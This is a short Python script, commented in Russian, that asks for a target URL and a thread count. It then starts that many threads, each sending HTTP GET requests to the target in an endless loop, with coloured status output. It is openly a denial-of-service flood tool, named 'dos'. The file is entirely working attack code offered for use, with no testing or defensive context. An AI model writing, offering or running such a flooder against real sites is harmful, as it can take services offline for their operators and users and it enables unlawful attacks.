import colorama
import threading
import requests

#функция, которая будет отправлять запросы и контролировать состояние цели:
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


threads = 20

url = input("URL: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")